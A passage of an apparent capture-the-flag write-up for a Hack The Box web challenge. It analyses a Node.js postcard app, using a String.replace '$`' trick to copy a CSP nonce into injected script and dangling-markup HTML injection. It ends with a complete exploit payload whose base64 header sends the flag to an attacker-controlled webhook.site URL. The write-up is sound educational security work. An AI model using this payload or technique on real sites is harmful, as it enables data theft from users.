+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">date</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date().<span style="color:#a6e22e">toLocaleDateString</span>(<span style="color:#e6db74">&#39;en-US&#39;</span>, { <span style="color:#a6e22e">year</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;numeric&#39;</span>, <span style="color:#a6e22e">month</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;long&#39;</span>, <span style="color:#a6e22e">day</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;numeric&#39;</span> });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">nonce</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">nonce</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">date</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">recipient</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">escape</span>(<span style="color:#a6e22e">recipient</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sender</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">escape</span>(<span style="color:#a6e22e">sender</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">escape</span>(<span style="color:#a6e22e">message</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">secret</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">escape</span>(<span style="color:#a6e22e">secret</span>)
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">VIEWS_DIR</span>, <span style="color:#e6db74">&#39;postcard.html&#39;</span>), <span style="color:#e6db74">&#39;utf-8&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">renderTemplate</span>(<span style="color:#a6e22e">template</span>, <span style="color:#a6e22e">data</span>));
+</span></span><span style="display:flex;"><span>};</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//utils.js
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">escape</span>(<span style="color:#a6e22e">str</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&amp;/g</span>, <span style="color:#e6db74">&#34;&amp;amp;&#34;</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&lt;/g</span>, <span style="color:#e6db74">&#34;&amp;lt;&#34;</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&gt;/g</span>, <span style="color:#e6db74">&#34;&amp;gt;&#34;</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&#34;/g</span>, <span style="color:#e6db74">&#34;&amp;quot;&#34;</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&#39;/g</span>, <span style="color:#e6db74">&#34;&amp;#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">renderTemplate</span>(<span style="color:#a6e22e">template</span>, <span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>[<span style="color:#a6e22e">key</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">lines</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">template</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\n&#39;</span>).<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">line</span> =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">line</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">`{{ </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">key</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> }}`</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">line</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">`{{ </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">key</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> }}`</span>, <span style="color:#a6e22e">value</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">line</span>;
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lines</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">template</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>As a result, simple XSS payloads are encoded and are not interpreted by the browser.</p>
+<figure><img src="/assets/nomad-notes/failed-xss.png">
+</figure>
+
+<p>Analyzing the handler for <code>/destinations</code>, it is evident that the <code>name</code> parameter is inserted into the HTML without any sanitization, making it an easy vector for XSS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//controller.js
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">destinations</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Explorer&#39;</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">name</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">VIEWS_DIR</span>, <span style="color:#e6db74">&#39;destinations.html&#39;</span>), <span style="color:#e6db74">&#39;utf-8&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">renderTemplate</span>(<span style="color:#a6e22e">template</span>, <span style="color:#a6e22e">data</span>));
+</span></span><span style="display:flex;"><span>};</span></span></code></pre></div><p>However, the CORS-related restriction imposed by the application prevents the execution of JavaScript not authorized by the <code>nonce</code>.</p>
+<figure><img src="/assets/nomad-notes/blocked-xss.png">
+</figure>
+
+<p>Through this analysis, it was possible to identify a bot that accesses a path controlled by the attacker (within the application&rsquo;s domain) using Chrome, as well as XSS vectors that were blocked by both sanitization and CSP directives.</p>
+<h3 id="replace-sink">replace sink<a class="anchor" href="#replace-sink" aria-label="Link"></a></h3>
+<p>While analyzing other functions that interact with external parameters, it was identified that within <code>renderTemplate</code>, the <code>replace</code> function consumes parameters passed via the query string without any form of value validation or control, representing a potential sink for us to exploit.</p>
+<p>By reading the documentation for the <code>include</code> function, one can identify the possibility of using control characters that alter the function&rsquo;s behavior, thereby creating an opening for a potential injection attack, given that these characters are not modified by the <code>escape</code> function.</p>
+<figure><img src="/assets/nomad-notes/replace-docs.png">
+</figure>
+
+<p>By conducting small tests with each of these potential values, an interesting behavior was identified for the value <code>$`</code>: the entire line preceding the match is repeated before the replacement value. This creates an opportunity to copy the <code>nonce</code> value into our script, thereby generating a valid script tag that satisfies the application&rsquo;s CORS policy and allows for the execution of JavaScript.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- postcard.html --&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">{{</span> <span style="color:#a6e22e">nonce</span> <span style="color:#960050;background-color:#1e0010">}}</span>&gt;<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">secret</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{{ secret }}&#34;</span>;&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><figure><img src="/assets/nomad-notes/replace-test-abc.png">
+</figure>
+
+<p>By injecting a control character, and given the behavior of copying the entire line up to the replacement value, it becomes possible to write an arbitrary value inside a <code>script</code> tag that contains a <code>nonce</code> valid under CORS.</p>
+<p>This allows for the injection of JavaScript code to be executed, bypassing both CORS restrictions and the characters otherwise escaped by the <code>escape</code> function, thereby enabling an XSS vector. We were able to execute an <code>alert</code> function to confirm the discovered primitive.</p>
+<figure><img src="/assets/nomad-notes/test-alert.png">
+</figure>
+
+<p>With this vulnerability, it is possible to send the bot to a page containing our XSS payload and control the browser to perform a <code>fetch</code> request to <code>/report</code>. This satisfies the origin requirements, causing the browser to access the <code>/destinations</code> route with the flag included in the query string. However, a second issue must be addressed: how to retrieve the value of the flag without requiring a new XSS injection on the <code>/destinations</code> page.</p>
+<p>For this page, there is no script with a valid <code>nonce</code> that we could copy via the <code>include</code> sink. Consequently, CORS will block any XSS attempt.</p>
+<p>One weakness of this route is the absence of the <code>escape</code> method; while XSS is not a viable vector here, the injection of HTML code is still possible.</p>
+<p>In this article, we can find techniques for extracting user information using only HTML tags—without the need for JavaScript—which fits perfectly with the remaining problem: <a href="https://hacktricks.alquymia.com.br/pentesting-web/dangling-markup-html-scriptless-injection/index.html">https://hacktricks.alquymia.com.br/pentesting-web/dangling-markup-html-scriptless-injection/index.html</a></p>
+<p>So, the final attack plan is:</p>
+<ol>
+<li>Leverage the <code>include</code> sink to achieve a valid XSS, forcing the bot&rsquo;s browser to access the <code>/reports</code> route from a local origin; this, in turn, triggers a request to the <code>/destinations</code> route with the flag included in the query string.</li>
+<li>Send an HTML tag designed for data exfiltration via the <code>x-carta-auth-key</code> header; this tag will be injected into the <code>/destinations</code> page through the <code>name</code> parameter, ultimately exfiltrating the data to a webhook under control.</li>
+</ol>
+<h2 id="exploitation">Exploitation<a class="anchor" href="#exploitation" aria-label="Link"></a></h2>
+<p>The final payload to execute this plan is this value for the <code>POST /report</code> route:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">path=postcard%3Frecipient%3DPortas%26sender%3DPentest%26message%3D%253Cimg%2520src%3Dx%253E%26secret%3D%24`%3Bfetch(`%2Freport`%2C%7Bmethod%3A`POST`%2Cheaders%3A%7B%5B`content-type`%5D%3A`application%2Fx-www-form-urlencoded`%2C%5B`x-carta-auth-key`%5D%3Aatob(`PjxtZXRhIG5hbWU9InJlZmVycmVyIiBjb250ZW50PSJ1bnNhZmUtdXJsIj48bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwO3VybD1odHRwOi8vd2ViaG9vay5zaXRlLzk3NDQwODNiLWFiZGYtNDRjZC1iMWFiLTY4OTliMzhlMWQyYi8iPg%3D%3D`)%7D%2Cbody%3A`path%3D%2F`%7D)%3B%2F%2F</span></span></span></code></pre></div><figure><img src="/assets/nomad-notes/post-payload.png">
+</figure>
+
+<figure><img src="/assets/nomad-notes/fake-flag.png">
+</figure>
+
+<p>Now, simply apply the exploit in the production environment and obtain the actual flag.</p>
+<figure><img src="/assets/nomad-notes/real-post.png">
+</figure>
+
+<figure><img src="/assets/nomad-notes/real-flag.png">
+</figure>
+
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/ctf/hack-the-box/challenges-web/jerrytok/" class="flex align-center">
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#backward"></use></svg>
+        <span>Jerrytok</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/ctf/hack-the-box/challenges-web/templated/" class="flex align-center">
+        <span>Templated</span>
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#forward"></use></svg>
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay" aria-hidden="true"></label>
+    </main>
+
+    
+  
+  <aside class="book-toc" aria-label="Table of Contents">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#setup-test-environment">Setup test environment</a></li>
+    <li><a href="#taint-analisys">Taint Analisys</a>
+      <ul>
+        <li><a href="#replace-sink">replace sink</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a></li>
+  </ul>
+</nav>
+
+
+
+
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </div>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
